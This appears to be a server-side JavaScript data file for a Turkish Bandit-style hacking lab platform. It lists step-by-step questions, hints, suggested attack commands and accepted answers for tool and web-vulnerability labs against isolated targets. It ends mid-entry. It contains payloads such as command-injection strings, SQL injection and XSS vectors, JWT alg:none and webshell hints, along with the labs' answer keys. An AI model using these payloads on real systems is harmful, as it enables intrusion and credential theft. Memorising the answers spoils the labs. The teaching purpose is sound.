// ============================================================================
//  lib/steps.js — BANDIT-TARZI adım-adım soru/cevap motoru VERİSİ (SUNUCU-ONLY).
//  ⚠ Bu dosyayı ASLA bir "use client" bileşenine import etme — `accept` cevapları
//     tarayıcı bundle'ına sızar (tıpkı lib/flags.js gibi). Yalnız API route'ları
//     (app/api/steps) ve sunucu kodu import etmeli. UI yalnız publicSteps() çıktısını
//     (cevaplar AYIKLANMIŞ) alır.
//
//  Şekil:  slug -> { questions: [ { id, q, hint?, cmd?, accept?, isFlag? } ] }
//   • q       : soru metni (gizli değil)
//   • hint    : açılır ipucu (gizli değil)
//   • cmd     : önerilen örnek komut (gizli değil)
//   • accept  : kabul edilen cevap varyantları (GİZLİ) — normalize edilip karşılaştırılır
//   • isFlag  : true ise cevap accept yerine FLAGS[slug] ile karşılaştırılır (tek kaynak)
//
//  Son soru DAİMA isFlag:true olmalı (Bandit'te son adım = flag).
// ============================================================================
import { FLAGS } from "./flags.js";

// slug -> { questions: [...] }
export const STEP_LABS = {
  // ── Linux Temelleri (SSH'li kutu-lab; cevaplar docker/targets/linux seed'ine göre) ──
  "tool-linux": {
    questions: [
      { id: 1, q: "Hedefe SSH ile bağlandın. `whoami` çalıştır: hangi kullanıcı olarak girdin?", hint: "Komut: whoami", cmd: "whoami", accept: ["ordek"] },
      { id: 2, q: "Bulunduğun ev dizininin TAM yolu nedir?", hint: "Komut: pwd", cmd: "pwd", accept: ["/home/ordek"] },
      { id: 3, q: "Ev dizininde düz `ls` (gizli olmayan) kaç öğe (dosya+dizin) listeliyor?", hint: "Komut: ls — çıkan satırları say.", cmd: "ls", accept: ["4", "dört"] },
      { id: 4, q: "`notlar/ipucu.txt` dosyasını oku: gizli base64 dosyası HANGİ dizinin içinde saklı?", hint: "Komut: cat notlar/ipucu.txt", cmd: "cat notlar/ipucu.txt", accept: ["veriler", "veriler/", "/home/ordek/veriler"] },
      { id: 5, q: "O dizindeki base64 kodlu gizli dosyanın adı nedir?", hint: "Komut: ls veriler", cmd: "ls veriler", accept: ["gizli.b64", "veriler/gizli.b64"] },
      { id: 6, q: "Gizli dosyayı base64'ten çöz → çıkan ordek{...} değeri FLAG'tir. Buraya yapıştır.", hint: "Komut: base64 -d veriler/gizli.b64", cmd: "base64 -d veriler/gizli.b64", isFlag: true },
    ],
  },

  // ── Nmap — Port & Servis Keşfi (hedef = docker/targets/web: port 80 + gizli 31337) ──
  "tool-nmap": {
    questions: [
      { id: 1, q: "`nmap 10.13.37.10` ile hedefi tara: standart web (HTTP) servisi hangi portta çalışıyor?", hint: "Varsayılan taramada görünen yaygın port.", cmd: "nmap 10.13.37.10", accept: ["80"] },
      { id: 2, q: "`nmap -p- 10.13.37.10` ile TÜM portları tara: hedefte toplam kaç TCP port AÇIK (open)?", hint: "65535 portun hepsi taranır; open çıkanları say.", cmd: "nmap -p- --min-rate 2000 10.13.37.10", accept: ["2", "iki"] },
      { id: 3, q: "Açık portlardan hangisi 'gizli' yüksek porttur? (yalnız numara)", hint: "1024 üstü, standart taramada görünmeyen port.", cmd: "nmap -p- 10.13.37.10", accept: ["31337"] },
      { id: 4, q: "Gizli servisin banner'ını oku → içindeki FLAG'i buraya yapıştır.", hint: "Komut: nmap -sV -p31337 10.13.37.10  ya da  nc 10.13.37.10 31337", cmd: "nc 10.13.37.10 31337", isFlag: true },
    ],
  },

  // ── ffuf — gizli dizin keşfi (hedef = docker/targets/web; robots.txt → /admin/flag.txt) ──
  "tool-ffuf": {
    questions: [
      { id: 1, q: "Önce `robots.txt`'i oku: kaç tane Disallow (gizlenen yol) satırı var?", hint: "Komut: curl http://target/robots.txt", cmd: "curl http://target/robots.txt", accept: ["2", "iki"] },
      { id: 2, q: "Gizlenen `/admin` dizinini fuzzla: içindeki flag dosyasının adı nedir?", hint: "ffuf ile /admin/FUZZ dene; ya da /admin sayfasındaki bağlantıya bak.", cmd: "ffuf -u http://target/admin/FUZZ -w wordlist.txt", accept: ["flag.txt", "/admin/flag.txt", "admin/flag.txt"] },
      { id: 3, q: "O dosyayı oku → içindeki FLAG'i buraya yapıştır.", hint: "Komut: curl http://target/admin/flag.txt", cmd: "curl http://target/admin/flag.txt", isFlag: true },
    ],
  },

  // ── nikto — sunucu yanlış yapılandırma (hedef = web; x-ordek-flag başlığı) ──
  "tool-nikto": {
    questions: [
      { id: 1, q: "`curl -I` ile yanıt başlıklarına bak: 'Server' başlığı hangi yazılım/sürümü bildiriyor?", hint: "Komut: curl -I http://target/", cmd: "curl -I http://target/", accept: ["Apache/2.2.8 (Unix)", "Apache/2.2.8", "apache 2.2.8"] },
      { id: 2, q: "Yanıtta alışılmadık, 'x-ordek-' ile başlayan bir başlık var. Onun DEĞERİ FLAG'tir — buraya yapıştır.", hint: "nikto bu başlığı raporlar; `curl -I http://target/` ile de görürsün.", cmd: "curl -sI http://target/ | grep -i x-ordek", isFlag: true },
    ],
  },

  // ── sqlmap — otomatik SQLi/DB dump (hedef = web; /product?id= + secrets tablosu) ──
  "tool-sqlmap": {
    questions: [
      { id: 1, q: "`/product?id=1` parametresi SQLi'ye açık. `products` tablosunda kaç ürün (satır) var?", hint: "sqlmap --dump ile ya da id=1,2,3 dene.", cmd: "sqlmap -u 'http://target/product?id=1' --dump", accept: ["3", "üç"] },
      { id: 2, q: "Veritabanında flag'i barındıran GİZLİ tablonun adı nedir?", hint: "sqlmap --tables ile tüm tabloları listele.", cmd: "sqlmap -u 'http://target/product?id=1' --tables", accept: ["secrets"] },
      { id: 3, q: "O tablodaki flag'i dök → FLAG'i buraya yapıştır.", hint: "Komut: sqlmap -u 'http://target/product?id=1' -T secrets --dump", cmd: "sqlmap -u 'http://target/product?id=1' -T secrets --dump", isFlag: true },
    ],
  },

  // ── hydra — online brute-force (hedef = web; /login admin:ducky) ──
  "tool-hydra": {
    questions: [
      { id: 1, q: "Giriş formunu hedefliyorsun. Kırmaya çalıştığın YÖNETİCİ kullanıcı adı nedir?", hint: "Tipik yönetici hesabı adı.", cmd: "hydra -L users.txt -P rockyou.txt target http-post-form ...", accept: ["admin"] },
      { id: 2, q: "Hydra ile rockyou sözlüğünden kırılan PAROLA nedir?", hint: "http-post-form modülüyle /login'i brute-force et.", cmd: "hydra -l admin -P /usr/share/wordlists/rockyou.txt target http-post-form '/login:username=^USER^&password=^PASS^:Hatalı'", accept: ["ducky"] },
      { id: 3, q: "Bu kimlikle giriş yapınca dönen FLAG'i buraya yapıştır.", hint: "Doğru parola ile POST atınca sayfa flag'i yazar.", cmd: "curl -d 'username=admin&password=ducky' http://target/login", isFlag: true },
    ],
  },

  // ── burp — fiyat manipülasyonu (hedef = web; /buy price<=1 → flag) ──
  "tool-burp": {
    questions: [
      { id: 1, q: "`/buy` sayfasındaki gizli (hidden) `price` alanının gönderilen değeri kaç?", hint: "Sayfanın kaynağına / Burp'te isteğe bak.", cmd: "curl http://target/buy", accept: ["300"] },
      { id: 2, q: "Siparişin 'bedava' sayılması için fiyatı EN FAZLA kaça indirmen gerekiyor?", hint: "Sunucu price değerini doğrularken bir eşik kullanıyor.", cmd: "# Burp Repeater: price=... değerini değiştir", accept: ["1"] },
      { id: 3, q: "Fiyatı manipüle edip isteği gönder → dönen FLAG'i buraya yapıştır.", hint: "Komut: curl -d 'item=Hoodie&price=1' http://target/buy", cmd: "curl -d 'item=Hoodie&price=1' http://target/buy", isFlag: true },
    ],
  },

  // ── dnsrecon — yetkisiz zone transfer (hedef = docker/targets/dns; AXFR → TXT flag) ──
  "tool-dnsrecon": {
    questions: [
      { id: 1, q: "Yetkisiz zone transfer (AXFR) çek: aktarılan zone (domain) adı nedir?", hint: "dig @target ordek.lab AXFR  ya da  dnsrecon -t axfr -d ordek.lab -n target", cmd: "dig @target ordek.lab AXFR", accept: ["ordek.lab", "ordek.lab."] },
      { id: 2, q: "AXFR çıktısında 'secret' kaydının işaret ettiği IP adresi nedir?", hint: "A kayıtlarına bak.", cmd: "dig @target ordek.lab AXFR", accept: ["10.0.0.66"] },
      { id: 3, q: "Flag hangi DNS kayıt TÜRÜnde saklı? (A / TXT / MX…)", hint: "Sıra dışı bir kayıt türü.", cmd: "dig @target ordek.lab AXFR", accept: ["txt"] },
      { id: 4, q: "O kayıttaki (flag.ordek.lab TXT) FLAG'i buraya yapıştır.", hint: "dig @target flag.ordek.lab TXT", cmd: "dig @target flag.ordek.lab TXT", isFlag: true },
    ],
  },

  // ── smb — anonim (guest) paylaşım (hedef = docker/targets/smb; flag.txt 'public' içinde) ──
  "tool-smb": {
    questions: [
      { id: 1, q: "`smbclient -L //target -N` ile paylaşımları listele: anonim erişilen paylaşımın adı nedir?", hint: "guest ok = yes olan paylaşım.", cmd: "smbclient -L //target -N", accept: ["public"] },
      { id: 2, q: "O paylaşıma anonim bağlanıp dizini listele: flag'i içeren dosyanın adı nedir?", hint: "smbclient //target/public -N -c ls", cmd: "smbclient //target/public -N -c ls", accept: ["flag.txt"] },
      { id: 3, q: "O dosyayı oku → FLAG'i buraya yapıştır.", hint: "smbclient //target/public -N -c 'get flag.txt -'", cmd: "smbclient //target/public -N -c 'get flag.txt -'", isFlag: true },
    ],
  },

  // ── wpscan — WordPress enumerasyon (hedef = docker/targets/wp; plugin readme'de flag) ──
  "tool-wpscan": {
    questions: [
      { id: 1, q: "Hedef WordPress'in sürümü nedir?", hint: "wpscan --url http://target  ya da  curl http://target/readme.html", cmd: "wpscan --url http://target", accept: ["5.8.1"] },
      { id: 2, q: "Kullanıcı enumerasyonuyla (?author=1 / wp-json) bulunan yönetici kullanıcı adı nedir?", hint: "curl -i 'http://target/?author=1' → yönlenmeye bak.", cmd: "curl -i 'http://target/?author=1'", accept: ["admin"] },
      { id: 3, q: "Zafiyetli eklentinin slug'ı (dizin adı) nedir?", hint: "/wp-content/plugins/ altına bak.", cmd: "wpscan --url http://target --enumerate p", accept: ["ordek-vuln"] },
      { id: 4, q: "O eklentinin readme.txt'inde SIZAN FLAG'i buraya yapıştır.", hint: "curl http://target/wp-content/plugins/ordek-vuln/readme.txt", cmd: "curl http://target/wp-content/plugins/ordek-vuln/readme.txt", isFlag: true },
    ],
  },

  // ── metasploit — vsftpd 2.3.4 backdoor (hedef = docker/targets/cve; /root/flag.txt) ──
  "tool-metasploit": {
    questions: [
      { id: 1, q: "21/FTP portunu banner'la: çalışan servis ve sürümü nedir?", hint: "nmap -sV -p21 target  ya da  nc target 21", cmd: "nmap -sV -p21 target", accept: ["vsftpd 2.3.4", "vsftpd2.3.4", "2.3.4"] },
      { id: 2, q: "Bu sürümün backdoor'u (CVE-2011-2523) tetiklenince kök kabuk hangi portta açılır?", hint: "exploit/unix/ftp/vsftpd_234_backdoor", cmd: "msfconsole -q", accept: ["6200"] },
      { id: 3, q: "Kabuğu al ve /root/flag.txt'i oku → FLAG'i buraya yapıştır.", hint: "use exploit/unix/ftp/vsftpd_234_backdoor; set RHOSTS target; run → cat /root/flag.txt", cmd: "cat /root/flag.txt", isFlag: true },
    ],
  },

  // ── searchsploit — public exploit bul & çalıştır (hedef = cve) ──
  "tool-searchsploit": {
    questions: [
      { id: 1, q: "FTP banner'ındaki yazılım/sürüm nedir?", hint: "nc target 21", cmd: "nc target 21", accept: ["vsftpd 2.3.4", "2.3.4"] },
      { id: 2, q: "`searchsploit vsftpd 2.3.4` ile bulunan exploit kök kabuğu hangi portta açar?", hint: "backdoor portu.", cmd: "searchsploit vsftpd 2.3.4", accept: ["6200"] },
      { id: 3, q: "Backdoor'a bağlanıp /root/flag.txt'i oku → FLAG'i buraya yapıştır.", hint: "nc target 6200 → cat /root/flag.txt", cmd: "nc target 6200", isFlag: true },
    ],
  },

  // ── msfvenom — payload/shell sonrası flag oku (hedef = cve; root kabuk) ──
  "tool-msfvenom": {
    questions: [
      { id: 1, q: "Kök kabuğa ulaşınca `whoami` ne döner (hangi kullanıcı)?", hint: "Backdoor root kabuk verir.", cmd: "whoami", accept: ["root"] },
      { id: 2, q: "Flag hangi dosyada saklı? (tam yol)", hint: "Genelde /root altında.", cmd: "ls -la /root", accept: ["/root/flag.txt"] },
      { id: 3, q: "O dosyayı oku → FLAG'i buraya yapıştır.", hint: "cat /root/flag.txt", cmd: "cat /root/flag.txt", isFlag: true },
    ],
  },

  // ── wireshark — HTTP düz metin parola yakala (kurban admin:FLAG yollar) ──
  "tool-wireshark": {
    questions: [
      { id: 1, q: "HTTP (şifresiz) giriş trafiğini yakala: kurban hangi kullanıcı adıyla giriş yapıyor?", hint: "POST /login gövdesindeki username.", cmd: "# Wireshark filtresi: http.request.method == \"POST\"", accept: ["admin"] },
      { id: 2, q: "Giriş isteği hangi yola (path) gidiyor?", hint: "POST hedefi.", cmd: "# http filtresi", accept: ["/login", "login"] },
      { id: 3, q: "Yakaladığın POST'taki 'password' değeri FLAG'tir → buraya yapıştır.", hint: "Düz metin parola tel üstünde görünür.", cmd: "# password= alanı", isFlag: true },
    ],
  },

  // ── tcpdump — pcap filtre ile parola yakala (kurban admin:FLAG yollar) ──
  "tool-tcpdump": {
    questions: [
      { id: 1, q: "80/HTTP trafiğini yakala: kurbanın giriş yaptığı kullanıcı adı nedir?", hint: "tcpdump -A ile gövdeyi oku.", cmd: "tcpdump -i any -A 'tcp port 80 and host target'", accept: ["admin"] },
      { id: 2, q: "Giriş isteğinin yöntemi (HTTP method) nedir?", hint: "Form gönderimi.", cmd: "# tcpdump -A çıktısı", accept: ["post"] },
      { id: 3, q: "Yakaladığın 'password' değeri FLAG'tir → buraya yapıştır.", hint: "Düz metin gövdede.", cmd: "# password= alanı", isFlag: true },
    ],
  },

  // ── bettercap — ARP MITM ile kimlik çal (kurban admin:FLAG yollar) ──
  "tool-bettercap": {
    questions: [
      { id: 1, q: "ARP spoof + sniff başlat. Kurbanın giriş yaptığı kullanıcı adı nedir?", hint: "net.probe + arp.spoof + net.sniff.", cmd: "bettercap -iface eth0 -eval 'set arp.spoof.targets target; arp.spoof on; net.sniff on'", accept: ["admin"] },
      { id: 2, q: "Yakalanan POST hangi yola gidiyor?", hint: "net.sniff HTTP çıktısı.", cmd: "# net.sniff", accept: ["/login", "login"] },
      { id: 3, q: "Yakaladığın 'password' değeri FLAG'tir → buraya yapıştır.", hint: "MITM ile düz metin parola.", cmd: "# password= alanı", isFlag: true },
    ],
  },

  // ── responder — LLMNR/NBT-NS zehirle, NetNTLM yakala&kır (parola = FLAG) ──
  "tool-responder": {
    questions: [
      { id: 1, q: "Responder'ı başlat. Kimlik doğrulamaya çalışan kurbanın kullanıcı adı nedir?", hint: "Responder çıktısındaki NetNTLM kullanıcısı.", cmd: "responder -I eth0", accept: ["victim"] },
      { id: 2, q: "Yakalanan NetNTLMv2 hash'ini kır: çıkan parola = FLAG → buraya yapıştır.", hint: "john/hashcat ile kır.", cmd: "john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt", isFlag: true },
    ],
  },

  // ── setoolkit — klon login sayfası, kimlik topla (parola = FLAG) ──
  "tool-setoolkit": {
    questions: [
      { id: 1, q: "Klonladığın sahte login sayfasına giren kurbanın kullanıcı adı nedir?", hint: "Toplanan POST'ta username.", cmd: "# SET → Credential Harvester", accept: ["victim"] },
      { id: 2, q: "Toplanan 'password' değeri FLAG'tir → buraya yapıştır.", hint: "Kurbanın gönderdiği parola.", cmd: "# harvested credentials", isFlag: true },
    ],
  },

  // ── evilginx — oturum çerezi çal (Set-Cookie session = FLAG) ──
  "tool-evilginx": {
    questions: [
      { id: 1, q: "Proxy ile çalınan oturum çerezinin ADI nedir? (Set-Cookie)", hint: "Sunucu giriş sonrası bir oturum çerezi veriyor.", cmd: "# evilginx lure / session", accept: ["session"] },
      { id: 2, q: "O oturum çerezinin DEĞERİ FLAG'tir → buraya yapıştır.", hint: "session=... değeri.", cmd: "# captured cookie", isFlag: true },
    ],
  },

  // ── john — MD5 hash kır (loot: hashes.txt = md5(FLAG), wordlist'te FLAG var) ──
  "tool-john": {
    questions: [
      { id: 1, q: "İndirdiğin hashes.txt bir MD5 hash'i. John'da bunu kırmak için hangi --format kullanılır?", hint: "Ham MD5 formatı.", cmd: "john --list=formats | grep -i md5", accept: ["raw-md5", "--format=raw-md5", "md5"] },
      { id: 2, q: "Sözlükle (wordlist.txt) hash'i kır → kırılan düz metin FLAG'tir → buraya yapıştır.", hint: "john --format=Raw-MD5 --wordlist=wordlist.txt hashes.txt  →  john --show hashes.txt", cmd: "john --format=Raw-MD5 --wordlist=wordlist.txt hashes.txt", isFlag: true },
    ],
  },

  // ── hashcat — MD5 hash kır (loot: hash.txt = md5(FLAG)) ──
  "tool-hashcat": {
    questions: [
      { id: 1, q: "hash.txt bir MD5 hash'i. hashcat'te MD5 için hangi hash-modu (-m) numarası kullanılır?", hint: "Ham MD5 mod numarası.", cmd: "hashcat --help | grep -i 'MD5'", accept: ["0", "md5"] },
      { id: 2, q: "Sözlükle hash'i kır → kırılan düz metin FLAG'tir → buraya yapıştır.", hint: "hashcat -m 0 hash.txt wordlist.txt  →  hashcat -m 0 hash.txt --show", cmd: "hashcat -m 0 hash.txt wordlist.txt --show", isFlag: true },
    ],
  },

  // ── theharvester — OSINT (loot: osint.txt; 2 e-posta + FLAG bir hostname olarak sızar) ──
  "tool-theharvester": {
    questions: [
      { id: 1, q: "İndirdiğin osint.txt'te [emails] bölümünde kaç e-posta adresi toplanmış?", hint: "admin@… ve it@… say.", cmd: "grep '@' osint.txt", accept: ["2", "iki"] },
      { id: 2, q: "[hosts] listesinde sıra dışı, 'ordek{' ile başlayan bir kayıt sızmış. Oradaki FLAG'i (ordek{...} kısmı) buraya yapıştır.", hint: "<flag>.ordek.lab biçiminde bir hostname.", cmd: "grep 'ordek{' osint.txt", isFlag: true },
    ],
  },

  // ── aircrack — WPA2 el sıkışması kır (loot: handshake.cap; passphrase = FLAG) ──
  "tool-aircrack": {
    questions: [
      { id: 1, q: "handshake.cap hangi kablosuz güvenlik protokolünün 4'lü el sıkışmasını içerir? (WPA / WPA2)", hint: "Modern Wi-Fi şifreleme protokolü.", cmd: "aircrack-ng handshake.cap", accept: ["wpa2", "wpa"] },
      { id: 2, q: "Sözlükle el sıkışmasını kır → bulunan WPA passphrase FLAG'tir → buraya yapıştır.", hint: "aircrack-ng -w wordlist.txt handshake.cap", cmd: "aircrack-ng -w wordlist.txt handshake.cap", isFlag: true },
    ],
  },

  // ── FAZ 2: 10 yeni araç ──
  "tool-nuclei": {
    questions: [
      { id: 1, q: "nuclei'nin 'sızıntı' şablonlarını seçmek için hangi etiketi (-tags) kullanırsın?", hint: "Açıkta kalan dosya/config.", cmd: "nuclei -u http://10.13.37.10 -tags exposure", accept: ["exposure", "exposures"] },
      { id: 2, q: "nuclei'nin bulduğu sızan dosyayı oku → içindeki SECRET (flag) değerini yapıştır.", hint: "curl http://10.13.37.10/.env", cmd: "curl http://10.13.37.10/.env", isFlag: true },
    ],
  },
  "tool-gobuster": {
    questions: [
      { id: 1, q: "gobuster ile keşfettiğin gizli yönetim dizininin adı nedir? (/...)", hint: "Yaygın yönetim yolu.", cmd: "gobuster dir -u http://10.13.37.10 -w common.txt", accept: ["/admin", "admin"] },
      { id: 2, q: "O dizindeki flag dosyasını oku → FLAG'i yapıştır.", hint: "curl http://10.13.37.10/admin/flag.txt", cmd: "curl http://10.13.37.10/admin/flag.txt", isFlag: true },
    ],
  },
  "tool-whatweb": {
    questions: [
      { id: 1, q: "whatweb'in raporladığı sunucu yazılımı/sürümü nedir? (kısaca)", hint: "Eski bir Apache.", cmd: "whatweb http://10.13.37.10", accept: ["apache", "apache/2.2.8", "apache 2.2.8"] },
      { id: 2, q: "Sayfanın <meta name=generator> alanındaki gizli FLAG'i yapıştır.", hint: "curl -s http://10.13.37.10/ | grep generator", cmd: "whatweb -a 3 http://10.13.37.10", isFlag: true },
    ],
  },
  "tool-sslscan": {
    questions: [
      { id: 1, q: "Hedef TLS servisi hangi portta dinliyor?", hint: "Standart HTTPS.", cmd: "sslscan 10.13.37.10:443", accept: ["443"] },
      { id: 2, q: "Sertifikanın Subject OU alanındaki gizli FLAG'i yapıştır.", hint: "openssl s_client -connect 10.13.37.10:443 | openssl x509 -noout -subject", cmd: "sslscan 10.13.37.10:443", isFlag: true },
    ],
  },
  "tool-netexec": {
    questions: [
      { id: 1, q: "netexec'te SMB paylaşımlarını listelemek için hangi bayrağı kullanırsın?", hint: "--...", cmd: "nxc smb 10.13.37.10 -u '' -p '' --shares", accept: ["--shares", "shares"] },
      { id: 2, q: "Anonim okunabilir paylaşımdaki dosyadan FLAG'i çek → yapıştır.", hint: "public paylaşımında flag.txt.", cmd: "nxc smb 10.13.37.10 -u '' -p '' --shares", isFlag: true },
    ],
  },
  "tool-impacket": {
    questions: [
      { id: 1, q: "impacket-smbclient'te parolasız (null/guest) bağlanmak için hangi bayrak?", hint: "-no-...", cmd: "impacket-smbclient -no-pass guest@10.13.37.10", accept: ["-no-pass", "no-pass"] },
      { id: 2, q: "Paylaşımdan indirdiğin dosyadaki FLAG'i yapıştır.", hint: "use public ; get flag.txt", cmd: "impacket-smbclient -no-pass guest@10.13.37.10", isFlag: true },
    ],
  },
  "tool-gitleaks": {
    questions: [
      { id: 1, q: "gitleaks'i mevcut depo geçmişini taramak için hangi alt komutla çalıştırırsın?", hint: "git geçmişini tara.", cmd: "gitleaks detect --source .", accept: ["detect"] },
      { id: 2, q: "Geçmişe sızmış (silinmiş) sırrı bul → FLAG'i yapıştır.", hint: "git log --all -p | grep ordek{", cmd: "gitleaks detect --source . -v", isFlag: true },
    ],
  },
  "tool-subfinder": {
    questions: [
      { id: 1, q: "İzole ağda subfinder'a iç DNS resolver'ı vermek için hangi bayrağı kullanırsın?", hint: "-r <ip>", cmd: "subfinder -d ordek.lab -r 10.13.37.10", accept: ["-r", "r"] },
      { id: 2, q: "Gizli subdomain'in TXT kaydındaki FLAG'i `dig` ile oku → yapıştır.", hint: "dig @10.13.37.10 flag.ordek.lab TXT +short", cmd: "dig @10.13.37.10 flag.ordek.lab TXT +short", isFlag: true },
    ],
  },
  "tool-commix": {
    questions: [
      { id: 1, q: "commix'i etkileşimsiz (varsayılanları kabul) çalıştıran bayrak nedir?", hint: "--...", cmd: "commix -u 'http://10.13.37.10/ping?host=127.0.0.1' --batch", accept: ["--batch", "batch"] },
      { id: 2, q: "Aldığın shell'de /tmp/ci_flag.txt'i oku → FLAG'i yapıştır.", hint: "--os-cmd='cat /tmp/ci_flag.txt'", cmd: "commix -u 'http://10.13.37.10/ping?host=127.0.0.1' --batch --os-cmd='cat /tmp/ci_flag.txt'", isFlag: true },
    ],
  },
  "tool-dalfox": {
    questions: [
      { id: 1, q: "dalfox'un payload enjekte edeceği parametre yerine koyduğun anahtar kelime nedir?", hint: "Büyük harf.", cmd: "dalfox url 'http://10.13.37.10/search?q=FUZZ'", accept: ["FUZZ", "fuzz"] },
      { id: 2, q: "XSS doğrulanan /search sayfasının kaynağındaki gizli FLAG'i yapıştır.", hint: "curl '.../search?q=<script>1</script>' | grep ordek{", cmd: "dalfox url 'http://10.13.37.10/search?q=FUZZ'", isFlag: true },
    ],
  },

  // ════════════════════════ WEB ZAFİYET LABLARI (VULNS) ════════════════════════
  // Cevaplar app/labData.js'teki `solution` alanlarından türetildi. Son adım = sömürü
  // başarınca hedef sayfada görünen flag'i yapıştırmak. Seviye (low/medium/high) panelden
  // gelir; final adım o seviyeyi solved işaretler.

  // ── ÇEKİRDEK ──
  "brute-force": {
    questions: [
      { id: 1, q: "Bu portalda hedeflediğin yönetici hesabının kullanıcı adı nedir?", hint: "Tipik yönetici adı.", accept: ["admin"] },
      { id: 2, q: "Parola bir sözlük kelimesi (ipucu: kuş). Hangi kelime?", hint: "İngilizce 'kuş'.", accept: ["bird"] },
      { id: 3, q: "Bu kimlikle giriş yapınca çıkan FLAG'i buraya yapıştır.", hint: "admin/bird ile gir → flag banner.", isFlag: true },
    ],
  },
  "command-injection": {
    questions: [
      { id: 1, q: "Komut enjeksiyonuyla okuyacağın flag dosyası hangi tam yolda?", hint: "/tmp altında.", accept: ["/tmp/flag.txt"] },
      { id: 2, q: "Sömürüp dosyayı oku (örn. `127.0.0.1; cat /tmp/flag.txt`) → çıkan FLAG'i yapıştır.", hint: "Low: ; · Medium: | · High: ${IFS}", isFlag: true },
    ],
  },
  "csrf": {
    questions: [
      { id: 1, q: "High seviyede 'yalnızca gönderilirse doğrulanır' kontrolünü atlatmak için formdan hangi alanı TAMAMEN çıkarırsın?", hint: "Anti-CSRF gizli alanı.", accept: ["csrf_token", "csrf token", "token"] },
      { id: 2, q: "Dış kaynaklı POST ile e-posta değişince çıkan FLAG'i buraya yapıştır.", hint: "Same-Origin olmayan otomatik form.", isFlag: true },
    ],
  },
  "file-inclusion": {
    questions: [
      { id: 1, q: "Path traversal ile okuyunca flag eklenen klasik sistem dosyası hangisi? (tam yol)", hint: "Unix kullanıcı dosyası.", accept: ["/etc/passwd", "etc/passwd"] },
      { id: 2, q: "Dosyayı oku (örn. `/lfi?file=../../../../etc/passwd`) → içeriğe eklenen FLAG'i yapıştır.", hint: "Medium: ....// ile tek-geçiş temizliğini atlat.", isFlag: true },
    ],
  },
  "sql-injection": {
    questions: [
      { id: 1, q: "UNION SELECT saldırısı için sorgudaki sütun sayısı kaç? (id,name,price,stock,description)", hint: "Beş alan.", accept: ["5", "beş"] },
      { id: 2, q: "Flag'i tutan 'flag' kullanıcısı hangi tabloda? (tablo adı)", hint: "Kullanıcı tablosu.", accept: ["users"] },
      { id: 3, q: "UNION SELECT ile 'flag' kullanıcısının password alanını dök → FLAG'i yapıştır.", hint: "0 UNION SELECT id,username,password,role,email FROM users--", isFlag: true },
    ],
  },
  "sql-injection-blind": {
    questions: [
      { id: 1, q: "Login bypass ile hangi kullanıcı olarak girmeye çalışıyorsun?", hint: "Yönetici.", accept: ["admin"] },
      { id: 2, q: "Parola alanına `' OR '1'='1` enjekte edip gir → dashboard'daki FLAG'i yapıştır.", hint: "Medium: oR / || varyantları.", isFlag: true },
    ],
  },
  "xss-reflected": {
    questions: [
      { id: 1, q: "Sayfada flag'i açan, çağırman gereken hazır JS fonksiyonunun adı nedir?", hint: "show... ile başlar.", accept: ["showflag", "showflag()", "window.showflag()"] },
      { id: 2, q: "Medium <script>'i siler. <img>/<svg> ile JS çalıştırmak için hangi olay (event) handler'ı kullanırsın?", hint: "onerror / onload.", accept: ["onerror", "onload"] },
      { id: 3, q: "Payload'u çalıştır (örn. `?q=<script>showFlag()</script>`) → açılan FLAG'i yapıştır.", hint: "Medium: <img src=x onerror=showFlag()>", isFlag: true },
    ],
  },
  "xss-stored": {
    questions: [
      { id: 1, q: "Yorumda çalıştıracağın, flag'i açan hazır fonksiyonun adı nedir?", hint: "Reflected XSS'teki ile aynı.", accept: ["showflag", "showflag()"] },
      { id: 2, q: "Kalıcı XSS yorumunu kaydet (örn. `<img src=x onerror=showFlag()>`) → tetiklenince çıkan FLAG'i yapıştır.", hint: "Sayfa her açıldığında tetiklenir.", isFlag: true },
    ],
  },
  "clickjacking": {
    questions: [
      { id: 1, q: "Bu saldırıda hassas paneli şeffaf bir ____ içine gömüp tıklamayı çalarsın. (HTML etiketi)", hint: "Gömme etiketi.", accept: ["iframe", "<iframe>"] },
      { id: 2, q: "Hedefi çerçevele (low/medium) → 'framing başarılı' banner'ındaki FLAG'i yapıştır.", hint: "High'da frame-ancestors 'none' bloklar.", isFlag: true },
    ],
  },
  "file-upload": {
    questions: [
      { id: 1, q: "Medium'da MIME kontrolünü atlatmak için declared Content-Type'ı ne yaparsın?", hint: "Gerçek resim MIME'ı.", accept: ["image/png", "image/jpeg"] },
      { id: 2, q: "Webshell yükle (low: shell.js) ve çalıştır → çıkan FLAG'i yapıştır.", hint: "Low her uzantıyı kabul eder.", isFlag: true },
    ],
  },

  // ── KİMLİK & YETKİ ──
  "insecure-jwt": {
    questions: [
      { id: 1, q: "Low'da imzasız token kabul ettiren JWT 'alg' değeri nedir?", hint: "İmza yok.", accept: ["none", "alg:none"] },
      { id: 2, q: "Medium'da token hangi zayıf secret ile yeniden imzalanır?", hint: "secret + sayı.", accept: ["secret123"] },
      { id: 3, q: "role=admin token ile giriş yap → FLAG banner'ını yapıştır.", hint: "Low: alg:none üret → giriş.", isFlag: true },
    ],
  },
  "cors-misconfig": {
    questions: [
      { id: 1, q: "Medium'da `origin.endsWith('ordek-store.com')` kontrolünü atlatan sahte origin nedir?", hint: "Önüne ek koy.", accept: ["https://evilordek-store.com", "evilordek-store.com"] },
      { id: 2, q: "Sahte Origin ile API'ye istek at → dönen JSON içindeki FLAG'i yapıştır.", hint: "Low: https://evil.com yeter.", isFlag: true },
    ],
  },
  "mass-assignment": {
    questions: [
      { id: 1, q: "Low'da yetki yükseltmek için gövdeye eklediğin gizli alan hangisi? ('admin' yaparsın)", hint: "Rol alanı.", accept: ["role"] },
      { id: 2, q: "Medium 'role'ü filtreler; hangi boolean alanı true göndererek atlatırsın?", hint: "is... alanı.", accept: ["isadmin", "isadmin:true"] },
      { id: 3, q: "Gizli alanı enjekte et → role=admin/isAdmin=true görününce çıkan FLAG'i yapıştır.", hint: "Burp/fetch ile gövdeye ekle.", isFlag: true },
    ],
  },
  "idor-bola": {
    questions: [
      { id: 1, q: "Senin siparişin 1002. Adminin siparişi (bir öncesi) hangi orderId?", hint: "1002'den bir eksik.", accept: ["1001"] },
      { id: 2, q: "O siparişi aç → admin faturasının NOT alanındaki FLAG'i yapıştır.", hint: "Medium UUID: order-a1b2c3d4-super-secret-admin", isFlag: true },
    ],
  },
  "mfa-bypass": {
    questions: [
      { id: 1, q: "Giriş yaptığın hesabın e-posta adresi nedir?", hint: "admin@…", accept: ["admin@ordek.com"] },
